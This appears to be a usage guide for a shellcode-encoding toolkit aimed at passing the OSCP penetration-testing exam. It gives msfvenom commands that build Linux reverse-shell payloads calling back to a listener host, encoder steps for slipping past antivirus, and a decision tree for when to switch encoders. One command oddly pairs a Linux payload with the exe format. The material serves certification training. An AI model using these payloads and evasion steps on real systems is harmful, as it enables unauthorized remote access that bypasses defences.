# ShellcodingDream - OSCP Exam Guide

## Before the Exam

### 1. Pull the Docker Image

```bash
docker pull shellcoding-dream:latest
# or build locally:
docker-compose build
```

### 2. Test All Encoders

```bash
# Generate test payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c > test.hex

# Test each encoder
for enc in xor rot13 base64 rc4 uuid ip mac; do
  echo "Testing $enc..."
  docker-compose run --rm shellcoding pipeline \
    --technique $enc --input test.hex --platform linux
done
```

### 3. Memorize These Commands

```bash
# Generate payload
docker-compose run --rm shellcoding encode \
  --technique xor --input PAYLOAD.hex --output encoded.c

# Compile
docker-compose run --rm shellcoding compile \
  --technique xor --input encoded.c --platform linux

# Full pipeline
docker-compose run --rm shellcoding pipeline \
  --technique xor --input PAYLOAD.hex --platform linux
```

## During the Exam

### Quick Decision Tree

```
Is AV/EDR blocking msfvenom?
│
├─ NO → Use raw payload
│       └─ Done
│
└─ YES → Try encoders (in order):
    │
    ├─ 1. XOR (30 sec)
    │   └─ Success? → Done
    │   └─ Fail? → Continue
    │
    ├─ 2. ROT13 (30 sec)
    │   └─ Success? → Done
    │   └─ Fail? → Continue
    │
    ├─ 3. Base64 (30 sec)
    │   └─ Success? → Done
    │   └─ Fail? → Continue
    │
    ├─ 4. RC4 (1 min)
    │   └─ Success? → Done
    │   └─ Fail? → Continue
    │
    └─ 5. Give up on this target
        └─ Come back later if time permits
```

### Time Budget Per Target

- **Exploitation**: 10 minutes
- **AV Evasion**: 3-5 minutes max
- **Testing**: 2 minutes
- **Total**: 15-20 minutes

**If evasion takes >5 minutes → SKIP and come back**

### Exam Workflow

```bash
# 1. Generate payload (30 sec)
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.10.10.100 LPORT=4444 -f c > shell.hex

# 2. Try XOR (1.5 min total)
docker-compose run --rm shellcoding pipeline \
  --technique xor --input shell.hex --platform linux

# 3. If successful → transfer and execute
# 4. If blocked → try next encoder

# 5. Try RC4 (1.5 min)
docker-compose run --rm shellcoding pipeline \
  --technique rc4 --input shell.hex --platform linux

# 6. Still blocked → try Base64, etc.
```

## What NOT to Do

❌ Don't waste time trying all 7 encoders (try top 4 only)
❌ Don't spend >5 minutes on one target
❌ Don't give up after first failure (try 2-3 encoders)
❌ Don't test on the target machine (test on your VM first)
❌ Don't include debug symbols in final binary

## What TO Do

✅ Test locally on your VM first
✅ Have pre-built payloads ready
✅ Start with XOR (fastest)
✅ Move on and come back later if stuck
✅ Document what worked for each target

## Command Cheat Sheet

```bash
# Show available encoders
docker-compose run --rm shellcoding list

# Quick reference
docker-compose run --rm shellcoding oscp

# Encode only
docker-compose run --rm shellcoding encode \
  --technique xor --input payload.hex --output encoded.c

# Compile only
docker-compose run --rm shellcoding compile \
  --technique xor --input encoded.c --platform linux

# Test only
docker-compose run --rm shellcoding test --payload ./shell

# Everything at once
docker-compose run --rm shellcoding pipeline \
  --technique xor --input payload.hex --platform linux
```

## Interactive Mode

```bash
# Step-by-step guided (good for exam stress)
docker-compose run --rm -it shellcoding interactive
```

## Emergency Options

**If Docker won't start:**
```bash
docker-compose restart
docker-compose up -d
```

**If you forget the commands:**
```bash
docker-compose run --rm shellcoding --help
docker-compose run --rm shellcoding oscp
```

**If you're out of time:**
```bash
# Just use raw msfvenom (no obfuscation)
# Move on to next target
msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=10.10.10.100 LPORT=4444 -f exe -o shell
```

## Performance Targets

- **Generate payload**: 30 seconds
- **Encode**: 30 seconds  
- **Compile**: 1 minute
- **Test**: 30 seconds
- **Total per encoder**: ~2.5 minutes
- **4 encoders**: ~10 minutes max

## Pre-Exam Checklist

- [ ] Docker image built/pulled
- [ ] All 4 main encoders tested
- [ ] Quick reference commands written down
- [ ] Tested on realistic lab targets
- [ ] Comfortable with decision tree

## During-Exam Checklist

- [ ] Test Docker works first (5 min)
- [ ] Use decision tree
- [ ] Skip if >5 minutes per target
- [ ] Document what worked
- [ ] Come back to hard targets later

## You've Got This! 💪

This toolkit will save you 10-15 minutes per target.

Use that time wisely:
- More privilege escalation attempts
- Better documentation
- Higher confidence
- Better sleep afterward

Good luck! 🎯
